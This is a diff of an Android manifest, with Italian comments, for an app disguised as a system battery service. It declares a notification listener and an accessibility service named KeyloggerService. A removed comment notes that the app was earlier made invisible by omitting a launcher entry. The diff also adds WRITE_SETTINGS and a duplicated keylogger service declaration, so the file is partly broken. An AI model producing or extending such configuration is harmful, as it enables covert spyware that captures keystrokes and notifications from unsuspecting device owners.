@@ -2,8 +2,10 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.android.system.batteryservice">
 
+    <!-- Permessi necessari -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
 
     <application
         android:allowBackup="true"
@@ -13,8 +15,18 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.BatteryService">
 
-        <!-- Nessuna intent-filter MAIN/LAUNCHER = App invisibile -->
+        <!-- Attività principale visibile -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:label="Battery Service">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
 
+        <!-- Servizio notifiche (facoltativo) -->
         <service
             android:name=".NotificationService"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
@@ -23,6 +35,20 @@
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
+
+        <!-- Servizio accessibilità (facoltativo) -->
+        <service
+            android:name=".KeyloggerService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/keylogger_config" />
+        </service>
+
         <service
             android:name=".KeyloggerService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -35,6 +61,7 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/keylogger_config" />
         </service>
-    </application>
 
+
+    </application>
 </manifest>
